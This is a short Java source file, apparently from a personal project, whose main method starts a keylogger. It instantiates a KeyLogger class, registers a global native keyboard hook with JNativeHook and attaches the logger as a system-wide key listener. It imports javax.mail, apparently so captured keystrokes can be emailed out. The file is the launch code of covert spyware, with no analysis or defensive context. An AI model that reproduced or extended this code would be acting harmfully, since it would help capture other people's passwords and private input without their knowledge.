/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package abc;

import abc.handler.KeyLogger;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.MessagingException;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

/**
 *
 * @author Huong
 */
public class NewClass {
    //abc abc 
    public static void main(String[] args) throws NativeHookException {
        
        try {
            KeyLogger service = new KeyLogger();
            GlobalScreen.registerNativeHook();
            GlobalScreen.getInstance().addNativeKeyListener(service.getKeybroad());
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        
        
    }
}
